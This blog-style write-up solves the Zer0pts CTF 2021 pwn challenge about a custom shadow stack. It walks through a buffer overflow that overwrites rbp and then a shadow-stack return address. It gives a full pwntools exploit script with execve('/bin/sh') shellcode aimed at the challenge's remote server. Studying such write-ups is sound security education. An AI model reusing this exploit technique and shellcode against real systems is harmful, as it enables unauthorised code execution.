<pre style="font-size: 0.4rem; text-align: center"> 
                                    WNKKKNW                                     
                                 WXxc'...':d0NW                                 
                              W0d:..'cxxdl,..'cx0N                              
                           NOo;..,lOXW    WKkl,..,cxKW                          
                       WXkl'..;o0N            NKxc,..,lkXW                      
                    WKxc'..:xKW                   N0xc'..;okXW                  
                 N0d;..'lkXW                          N0dc'..:oOXW              
              NOo,..,oON                                 WNOd:'.':xX            
            Kl'..;d0N                                        WXx' .dW           
           Wo  'xX                                         WKxc'..c0            
            Ko;..,cxKN                                  W0d:..'ckXW             
              WKkl,..,lxKW                           NOo,..,lON                 
                  W0l.  .,lkKW                   WXkl'..  .:xKN                 
                N0d;..'cl:'..;okXW            WKxc...:dOOd:'..,lxKW             
             NOo,..,lONW WXOo:...;oOXW     N0d;...cxKW    WXOo:...:0W           
           WO,..;d0N         WXOo;...;ok0ko,..,lOXW           Xx' .dW           
           Wx. 'o0N              WXkl;.....;o0N           WXkl,..:xX            
            W0d:'.,cx0N              WKOkOKW           WKx:..'ckXW              
               WXOo:'.,cxKN                         N0d;. .cON                  
                  W0l.  ..,lkKW                 WNOl,..,,..'cd0N                
               N0o;..'ckOxc'..,lkKW          WKxc'..:xKWWKxl,..,cx0N            
            WOl,..;oON     N0dc'..;lkKW   WKd:..'ckXW       NKxc. .oN           
           Wx. 'o0N           WNOd:'..;lol;..,oON           WXOl..'xW           
            0:..;oOXW             WXOo:'.':d0N           WXxc'.'ckXW            
             WKxc,.':oOXW             WNNNW           WKd:..,oON                
                 N0xc,.':d0N                       N0o;..;d0N                   
                    WN0d:'.'cd0N               WXkl,.':xKW                      
                        WN0d:'.,cx0N        WKxc'.'lkXW                         
                            WXOo:'.,cxKNWN0d:..,oONW                            
                                WXOo;'.,;,..;d0N                                
                                    WXOdookKW                                   

</pre>

---

This was a really cool pwn challenge from the Zer0pts CTF 2021 rated with 81 points. The description said:

> Elementary pwners love to overwrite the return address. This time you can't!

---

## First look

They gave us 3 files: the binary, a .S file and a markdown file.

Let's start with the markdown file:

They told us that they are using their own stack to handle the return addresses of the calls so you can't make a buffer overflow and redirect the execution. They implemented to macros for the `call` and `ret` instructions:

```
%macro call 1
;; __stack_shadow[__stack_depth++] = return_address;
  mov ecx, [__stack_depth]
  mov qword [__stack_shadow + rcx * 8], %%return_address
  inc dword [__stack_depth]
;; goto function
  jmp %1
  %%return_address:
%endmacro

%macro ret 0
;; goto __stack_shadow[--__stack_depth];
  dec dword [__stack_depth]
  mov ecx, [__stack_depth]
  jmp qword [__stack_shadow + rcx * 8]
%endmacro
```

So it looks like the `__stack_depth` is storing how many inner calls have happened so it can put the return address correctly in the `__stack_shadow`, which is where this stack really is.

Okey, let's take a look at the .S file:

```
global _start
section .text

%macro call 1
;; __stack_shadow[__stack_depth++] = return_address;
  mov ecx, [__stack_depth]
  mov qword [__stack_shadow + rcx * 8], %%return_address
  inc dword [__stack_depth]
;; goto function
  jmp %1
  %%return_address:
%endmacro

%macro ret 0
;; goto __stack_shadow[--__stack_depth];
  dec dword [__stack_depth]
  mov ecx, [__stack_depth]
  jmp qword [__stack_shadow + rcx * 8]
%endmacro

_start:
  call notvuln
  call exit

notvuln:
;; char buf[0x100];
  enter 0x100, 0
;; vuln();
  call vuln
;; write(1, "Data: ", 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x100);
  mov edx, 0x100
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return 0;
  xor eax, eax
  ret

vuln:
;; char buf[0x100];
  enter 0x100, 0
;; write(1, "Data: ", 6);
  mov edx, 6
  mov esi, msg_data
  xor edi, edi
  inc edi
  call write
;; read(0, buf, 0x1000);
  mov edx, 0x1000               ; [!] vulnerability
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
;; return;
  leave
  ret

read:
  xor eax, eax
  syscall
  ret

write:
  xor eax, eax
  inc eax
  syscall
  ret

exit:
  mov eax, 60
  syscall
  hlt
  
section .data
msg_data:
  db "Data: "
__stack_depth:
  dd 0

section .bss
__stack_shadow:
  resb 1024
```

It is the assembly code from the binary and also the function C code in comments, let's organize that:

```c
notvuln:
    char buf[0x100];
    vuln();
    write(1, "Data: ", 6);
    read(0, buf, 0x100);
    return 0;

vuln:
    char buf[0x100];
    write(1, "Data: ", 6);
    read(0, buf, 0x1000);
    return;
```

We can clearly see that the vuln function is expecting 0x100 bytes and reading 0x1000. Basic buffer overflow.

We can also see that the `__stack_depth` is in the `.data` section and the `__stack_shadow` is in the `.bss` section.

Let's look at the binary now:

![Security](/./assets/imgs/not-beginner-sec.png)

Okey so no protections at all. That looks cool.

## Developing the attack

We know where to start. The vuln function is reading 0x1000 bytes and the array is 0x100 so there we can overflow BUT the return address is not in the usual stack, it is in the handcrafted one so the only thing we can do here is override the `rbp`.

If we check the `not-vuln` function, we can see that the address where it puts the data we enter is referenced through the rbp:

```
  lea rsi, [rbp-0x100]
  xor edi, edi
  call read
```

Now we know that we can write 0x100 bytes wherever we want. As we saw in the beginning, we can check that the NX bit is not enabled so we can execute code in the stack. 

![Sections](/./assets/imgs/not-beginner-sections.png)

So the goal is to put some shellcode in any place which is executable and redirect the execution there.

## Putting all the pieces together

The steps are:

1. Write shellcode
2. Redirect execution to shellcode.

We also know that:

* We can write 0x100 bytes wherever we want
* There aren't any security mechanisms (no PIE, NX bit, canary, etc)

---

In order to redirect the execution, we have to change the return address in the `__stack_shadow`, the handcrafted stack. We can start writing exactly where the return address of the `notvuln` function is. 

That means we could return exactly where we will put the shellcode, because we have 0x100 bytes to send.

But we have a problem, as we saw before, the `.bss` is not executable and it has a length of 0x404, more that 0x100.

We also know that we can write 0x1000 on the `vuln` function. So first, we can redirect the execution there and then, because we control `rbp`, we can override the return address to point it to the shellcode and also write the shellcode in the `.bss`.

This looks promising!

## Writing the exploit

I used Python and Pwntools. First part, override the `rbp` variable with the buffer overflow so we write exactly where the return address is.

`.bss` starts at 0x00600234, which is where the handcrafted stack is. The read function will decrement the address by 0x100 so we have to add that to our address: 0x00600334. Finally, the `__stack_depth` value. In the vuln function, the main function only called the vuln one so the value would be 1. 

It multiplies the variable by 8 (`mov qword [__stack_shadow + rcx * 8], %%return_address`) so we have to add 8 * 1 to the address and that will result in: `0x0060033c`

``` python
from pwn import *

#p = process('./chall')
p = remote("pwn.ctf.zer0pts.com", 9011)
offset = b'A' * 0x100
p.clean()
first_exploit = offset + p64(0x0060033c)
p.sendline(first_exploit)
```

Now, let's write the address of the vuln function. We have to avoid the `enter 0x100, 0` because it will break our `rbp` so we will use the next address: `0x00400180`

```python
p.recv()
second_exploit = p64(0x00400180)
p.sendline(second_exploit)
p.recv()
```

And finally the last part. We will put the shellcode on 0x600740. We are writing on 0x0060023c so we need an offset of 0x504 (minus the 8 bytes from the address of the shellcode):

```python
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
offset2 = b'A' * (0x4fc)
third_exploit = p64(0x600740) + offset2 + shellcode
p.sendline(third_exploit)
p.interactive()
```

And we got it!

![Sections](/./assets/imgs/not-beginner-solved.png)
